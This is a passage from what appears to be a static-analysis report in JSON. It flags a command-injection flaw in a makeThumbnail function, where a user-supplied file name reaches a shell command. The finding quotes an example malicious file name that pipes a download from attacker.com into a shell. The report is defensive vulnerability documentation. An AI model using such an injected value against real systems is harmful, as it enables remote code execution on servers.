        {
          "ruleId": "command-injection",
          "level": "error",
          "message": {
            "text": "Command injection in makeThumbnail via user-controlled fileName. fileName originates from req.params.name and is embedded in a shell command string without sanitization. An attacker can inject shell metacharacters (e.g. a filename containing \"; curl attacker.com | sh;\") to execute arbitrary commands on the server."
          },
          "locations": [
